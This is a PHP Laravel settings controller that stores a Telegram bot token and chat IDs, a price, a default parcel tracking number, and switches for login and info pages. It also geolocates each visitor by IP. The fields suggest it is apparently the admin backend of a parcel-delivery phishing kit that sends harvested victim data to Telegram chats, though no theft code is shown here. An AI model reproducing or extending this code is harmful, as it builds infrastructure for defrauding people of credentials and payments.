<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Settings;
use App\Services\TelegramService;
use App\Services\IpApiService;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\Log;
use Carbon\Carbon;

class SettingsController extends Controller
{
    /**
     * @var IpApiService
     */
    protected $ipApiService;

    public function __construct(IpApiService $ipApiService)
    {
        $this->ipApiService = $ipApiService;
    }

    /**
     * Get all settings
     */
    public function index(): JsonResponse
    {
        $settings = Settings::first();
        
        if (!$settings) {
            // Create default settings if none exist
            $settings = Settings::create([
                'bot_token' => null,
                'chat_id' => null,
                'chat_id_info' => null,
                'price' => '0',
                'tracking' => 'PM478844410MA',
                'page_login' => true,
                'page_info' => true,
                'panel' => true,
                'panel_telegram' => true,
            ]);
        }
        
        return response()->json([
            'success' => true,
            'data' => $settings
        ]);
    }

        public function getConfig(Request $request): JsonResponse
    {
        $settings = Settings::first();
        
        $clientIp = $request->getClientIp();
        if ($clientIp === '127.0.0.1') {
            $clientIp = '196.117.173.102';
        }
        $ipDetails = $this->ipApiService->getIpDetails($clientIp);

        $timezone = $ipDetails['timezone'] ?? 'Europe/Berlin';
        $now = Carbon::now($timezone);

        $city = $ipDetails['city'] ?? null;
        $country = $ipDetails['country'] ?? null;
        $countryCode = $ipDetails['countryCode'] ?? null;

        $cityLabel = $city ? strtoupper($city) : 'GERMANY';
        $countryLabel = $country ? strtoupper($country) : 'BERLIN';

        $formattedTimestamp = sprintf(
            '%s at %s (UTC %s), %s%s%s',
            $now->format('l, j F Y'),
            $now->format('H:i'),
            $now->format('P'),
            $cityLabel,
            $cityLabel && $countryLabel ? ' - ' : '',
            $countryLabel
        );

        $config = [
            'price' => $settings ? $settings->price : '0',
            'tracking' => $settings ? $settings->tracking : 'PM478844410MA',
            'page_login' => $settings ? (bool)$settings->page_login : true,
            'page_info' => $settings ? (bool)$settings->page_info : true,
            'panel' => $settings ? (bool)$settings->panel : true,
            'panel_telegram' => $settings ? (bool)$settings->panel_telegram : true,
            'client_timestamp' => $formattedTimestamp,
            'client_location' => [
                'ip' => $clientIp,
                'city' => $city,
                'country' => $country,
                'country_code' => $countryCode,
                'timezone' => $timezone,
            ],
        ];
        
        return response()->json([
            'success' => true,
            'data' => $config
        ]);
    }

    /**
     * Update settings
     */
    public function update(Request $request, TelegramService $telegramService): JsonResponse
    {
        $validated = $request->validate([
            'bot_token' => ['nullable', 'string', 'max:255'],
            'chat_id' => ['nullable', 'string', 'max:255'],
            'chat_id_info' => ['nullable', 'string', 'max:255'],
            'price' => ['nullable', 'string', 'max:255'],
            'tracking' => ['nullable', 'string', 'max:255'],
            'page_login' => ['nullable', 'boolean'],
            'page_info' => ['nullable', 'boolean'],
            'panel' => ['nullable', 'boolean'],
            'panel_telegram' => ['nullable', 'boolean'],
        ]);

        //Log::info('Updating settings with data: ', $validated);

        // Update or create settings
        $settings = Settings::updateOrCreate(
            ['id' => 1],
            $validated
        );

        // Test bot and set webhook if bot_token is provided
        $message = 'Settings updated successfully!';
        $webhookStatus = null;
        $botInfo = null;

        if (!empty($validated['bot_token'])) {
            try {
                // First test if bot token is valid
                $botInfo = $telegramService->getBotInfo($validated['bot_token']);
                
                if ($botInfo) {
                    // Bot is valid, now always try to set webhook (important after reset)
                    $webhookSetResult = $telegramService->setWebhook($validated['bot_token']);
                    
                    if ($webhookSetResult) {
                        $message = 'Settings updated and webhook set successfully!';
                        $webhookStatus = 'success';
                    } else {
                        $message = 'Settings updated, bot is valid, but webhook setup failed.';
                        $webhookStatus = 'warning';
                    }
                } else {
                    $message = 'Settings updated, but bot token appears to be invalid.';
                    $webhookStatus = 'error';
                }
            } catch (\Exception $e) {
                $message = 'Settings updated, but telegram configuration failed: ' . $e->getMessage();
                $webhookStatus = 'error';
            }
        }

        return response()->json([
            'success' => true,
            'message' => $message,
            'data' => $settings->fresh(),
            'webhook_status' => $webhookStatus,
            'bot_info' => $botInfo
        ]);
    }

    /**
     * Get specific setting
     */
    public function show(string $key): JsonResponse
    {
        $settings = Settings::first();
        
        if (!$settings || !in_array($key, $settings->getFillable())) {
            return response()->json([
                'success' => false,
                'message' => 'Setting not found'
            ], 404);
        }
        
        return response()->json([
            'success' => true,
            'data' => [
                'key' => $key,
                'value' => $settings->{$key}
            ]
        ]);
    }
}
